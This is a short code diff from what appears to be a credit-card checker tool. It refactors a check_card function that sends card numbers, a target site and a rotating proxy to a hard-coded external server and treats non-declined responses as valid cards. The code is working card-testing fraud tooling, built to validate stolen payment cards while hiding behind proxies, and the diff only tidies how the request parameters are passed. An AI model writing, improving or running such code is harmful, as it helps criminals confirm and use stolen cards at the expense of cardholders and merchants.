@@ -64,16 +64,16 @@ async def check_card(user_id, cc, site=None):
         return "Site Not Found"
 
     proxy = get_proxy(user_id)
+    params = {"card": cc, "site": site}
     if proxy:
-        url = f"http://69.62.117.8:8000/check?card={cc}&site={site}&proxy={proxy}"
-    else:
-        url = f"http://69.62.117.8:8000/check?card={cc}&site={site}"
+        params["proxy"] = proxy
+    url = "http://69.62.117.8:8000/check"
 
     retries = 0
     while retries < 3:
         try:
             async with httpx.AsyncClient(timeout=100.0) as client:
-                response = await client.get(url)
+                response = await client.get(url, params=params)
                 data = response.json()
 
             if not any(x in data for x in ("CARD_DECLINED", "3DS_REQUIRED")):
